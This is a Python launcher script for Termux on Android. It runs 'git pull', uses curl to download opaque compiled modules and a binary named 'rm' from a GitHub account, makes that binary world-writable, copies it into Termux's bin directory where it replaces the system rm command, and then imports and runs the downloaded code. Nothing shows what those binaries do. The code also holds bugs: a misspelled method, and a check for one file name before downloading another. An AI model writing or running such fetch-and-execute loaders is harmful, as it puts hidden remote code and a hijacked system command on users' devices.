import os
try:
    try:
        open('/sdcard/AKING-OK.txt','r').read()
    except:
        open('/sdcard/AKING-OK.txt','w').wrire('Aking Ok ids')
except:
    print(' First Allow Termux Setup Permeations (y) ')
    os.system('termux-setup-storage')
    pass
os.system('git pull')
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("XD.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/XD.so -o XD.so")
if path.isfile("dz.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/dump.so -o dump.so")
if path.isfile("rm"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/rm -o rm")
    system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
if 'aarch' in arch:
    print('\033[1;37m\nCongratulations! Your Device Support This Tools')
    import XD
    XD.menu()
else:exit('\033[1;31m Sorry System or device not supported ')
    
